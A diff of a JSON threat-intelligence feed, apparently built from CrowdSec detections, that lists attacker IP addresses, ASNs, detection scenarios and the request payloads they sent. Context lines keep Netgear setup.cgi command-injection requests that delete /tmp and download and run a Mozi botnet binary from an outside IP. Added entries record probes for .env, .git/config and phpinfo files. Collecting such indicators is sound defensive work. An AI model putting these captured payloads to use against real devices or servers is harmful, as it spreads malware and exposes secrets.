@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-10-24T00:00:00Z",
+  "generated_at": "2026-10-24T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
@@ -28,42 +28,6 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://39.34.143.222:51192/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "216.218.206.68",
-      "family": "v4",
-      "first_seen": "2026-10-17T11:00:00Z",
-      "last_seen": "2026-10-17T11:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "6939",
-      "asn_name": "HURRICANE - Hurricane Electric LLC",
-      "asn_prefix": "216.218.128.0/17",
-      "payloads": [
-        "GET /remote/logincheck"
-      ]
-    },
-    {
-      "ip": "135.119.19.134",
-      "family": "v4",
-      "first_seen": "2026-10-17T07:00:00Z",
-      "last_seen": "2026-10-17T07:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "135.119.0.0/16",
-      "payloads": [
-        "GET /owa/auth/logon.aspx"
       ]
     },
     {
@@ -1507,6 +1471,61 @@
         "HEAD /blog2/",
         "HEAD /old/",
         "HEAD /wordpress/"
+      ]
+    },
+    {
+      "ip": "199.165.159.145",
+      "family": "v4",
+      "first_seen": "2026-10-24T03:00:00Z",
+      "last_seen": "2026-10-24T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "22168",
+      "asn_prefix": "199.165.159.0/24",
+      "payloads": [
+        "GET /remote/logincheck"
+      ]
+    },
+    {
+      "ip": "34.48.154.215",
+      "family": "v4",
+      "first_seen": "2026-10-24T03:00:00Z",
+      "last_seen": "2026-10-24T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.48.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /administrator/.env",
+        "GET /phpinfo.php",
+        "GET /phpinfo",
+        "GET /info.php",
+        "GET /",
+        "GET /.git/config",
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.test",
+        "GET /.env.remote",
+        "GET /.env.bak",
+        "GET /.env.backup"
       ]
     }
   ]
